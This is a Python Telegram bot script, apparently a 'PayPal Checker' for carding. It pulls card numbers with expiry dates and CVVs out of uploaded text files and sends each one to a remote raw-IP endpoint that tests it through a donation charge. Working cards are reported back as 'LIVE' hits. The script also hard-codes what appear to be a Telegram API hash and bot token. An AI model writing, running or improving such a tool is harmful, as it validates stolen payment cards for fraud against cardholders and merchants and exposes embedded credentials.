from telethon import TelegramClient, events
import re, asyncio, os
import aiohttp
import aiofiles

API_ID = 37235723
API_HASH = "880a876edaf529c8493b873d47821ec2"
BOT_TOKEN = "8783810252:AAEv2GtOJYG_-iBv1AMjvV8Le3kZBo9FJb0"

# ================== YOUR API ==================
async def check_paypal(card: str):
    try:
        url = f"http://138.128.240.15:8025/paypal_donate?cc={card}"
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=30) as res:
                if res.status != 200:
                    return {"Status": "Declined", "Response": f"HTTP {res.status}"}
                
                text = await res.text()
                lower = text.lower()
                if any(x in lower for x in ["approved", "success", "live", "charged"]):
                    return {"Status": "Approved", "Response": "✅ PAYPAL LIVE"}
                else:
                    return {"Status": "Declined", "Response": text[:150] or "Declined"}
    except Exception as e:
        return {"Status": "Declined", "Response": "API Error"}

# ================== TXT READER ==================
async def read_txt(path):
    cards = []
    async with aiofiles.open(path, "r", encoding="utf-8", errors="ignore") as f:
        content = await f.read()
        found = re.findall(r'\d{15,16}\s*[\|:/-]\s*\d{1,2}\s*[\|:/-]\s*\d{2,4}\s*[\|:/-]\s*\d{3,4}', content)
        for c in found:
            cleaned = re.sub(r'[^0-9|]', '', c.replace(' ', ''))
            if len(cleaned.split('|')) == 4:
                cards.append(cleaned)
    return list(set(cards))

# ================== BOT ==================
client = TelegramClient('txt_bot', API_ID, API_HASH)

@client.on(events.NewMessage(pattern=r'(?i)^[/.](start|help)$'))
async def start(event):
    await event.reply("**PayPal Checker**\nJust send .txt file")

@client.on(events.NewMessage())
async def txt_file(event):
    if not event.document: return
    if not str(event.file.name).lower().endswith('.txt'): return

    await event.reply("📂 Processing TXT file...")
    path = f"temp_{event.sender_id}.txt"
    await event.download_media(path)

    cards = await read_txt(path)
    os.remove(path)

    if not cards:
        return await event.reply("❌ No valid cards found!")

    await event.reply(f"✅ Found {len(cards)} cards. Starting check...")

    total = len(cards)
    approved = 0
    for i, card in enumerate(cards):
        res = await check_paypal(card)
        if res["Status"] == "Approved":
            approved += 1
            await event.reply(f"💎 **LIVE**\n`{card}`\n{res['Response']}")
        
        await event.reply(f"Progress: {i+1}/{total} | Hits: {approved}")
        await asyncio.sleep(3)

    await event.reply(f"✅ Finished!\nApproved: {approved}/{total}")

async def main():
    print("🚀 TXT Only Bot Started")
    await client.start(bot_token=BOT_TOKEN)
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
